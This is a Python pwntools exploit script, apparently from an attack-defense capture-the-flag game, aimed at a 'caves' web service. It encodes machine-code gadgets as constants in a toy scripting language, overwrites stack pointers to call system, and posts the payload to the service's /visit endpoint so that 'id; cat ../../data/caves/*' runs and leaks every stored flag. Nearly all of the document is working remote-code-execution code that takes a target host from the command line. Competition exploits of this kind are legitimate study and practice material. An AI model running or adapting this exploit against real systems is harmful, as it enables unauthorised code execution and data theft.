from __future__ import print_function, unicode_literals
import os

os.environ['TERM'] = 'xterm'
from pwn import *
from binascii import *
import requests

context.arch = 'amd64'


def pack_code(code):
	instructions = disasm(asm(code)).split('\n')
	constants = []
	for inst in instructions:
		binary = unhexlify(re.search(':\s+(([0-9a-f]{2}\s)+)', inst).group(1).replace(' ', ''))
		# constant compilation: 48 b8 (8b const)
		# eb xx = jmp xx
		c = binary + b'\xeb' + chr(5 + 2 + 8 - len(binary) - 2).encode('utf-8') + os.urandom(6 - len(binary))
		c = int(hexlify(c[::-1]), 16)
		c = c & 0x7fffffffffffffff
		constants.append(c)
	return 'eija gadgets() gebbtserick int: {\n' + \
		   '\n'.join('\tvar c{}: int = {};'.format(i, c) for i, c in enumerate(constants)) + \
		   '\n}\n'


def pack_cmd(cmd):
	cmd = cmd + '\x00'
	result = ['eija command() gebbtserick lischd byte: {',
			  '\tvar a: lischd byte = neie lischd byte ({});'.format(len(cmd))]
	for i, c in enumerate(cmd):
		result.append('\ta@{} = {};'.format(i, ord(c)))
	result += ['\tserick a;', '}']
	return '\n'.join(result)


def get_attack_script(command):
	gadgetfunc = pack_code('''
	// relative call to function +0x40
	.byte 0xe8
	.word 0x39
	.word 0x0
	add rax, 8
	mov rdi, rax
	ret
	''')

	attackscript = '''
	eija exploit(rsp: int, rbp: lischd int, mainaddr: int) gebbtserick int: {
		// 32 = offset between main and gadgets
		rbp@0 = mainaddr + 32 + 2;
		rbp@1 = rsp - 20; // = call system
	}
	
	eija main(
			// Ubuntu stack layout
			// rdi: int, rsi: int, rdx: int, rcx: int, r8: int, r9: int, this: int, x1: int, x2: int, x3: int, mainaddr: int,
			// y1: int, y2: int, y3: int, y4: int, y5: int, y6: int, y7: int, y8: int,
			// rbx: int, rbp: lischd int, rsp: int
			
			// Debian/Vulnbox stack layout
			rdi: int, rsi: int, rdx: int, rcx: int, r8: int, r9: int, x0: int, this: int, 
			x1: int, x2: int, x3: int, x4: int, x5: int, x6: int, x7: int, mainaddr: int,
			y1: int,
			rbx: int, rbp: lischd int, rsp: int
		) gebbtserick int: {
		serick mach exploit(rsp, rbp, mainaddr);
	}
	
	''' + gadgetfunc + pack_cmd(command)

	return attackscript

print(get_attack_script('id; cat ../../data/caves/*'))

def exploit(target):
	url = 'http://{}:9080/api'.format(target)
	# newest cave
	caveId = requests.get(url + '/caves/list').json()[-1]['id']
	# code execution - leak all flags
	attackscript = get_attack_script('id; cat ../../data/caves/*')
	response = requests.post(url + '/visit', json={"cave_id": caveId, "files": {"entry.sl": attackscript}})
	print('Status:', response.status_code)
	print(response.text)


if __name__ == '__main__':
	if len(sys.argv) > 1:
		exploit(sys.argv[1])
	else:
		exploit('localhost')
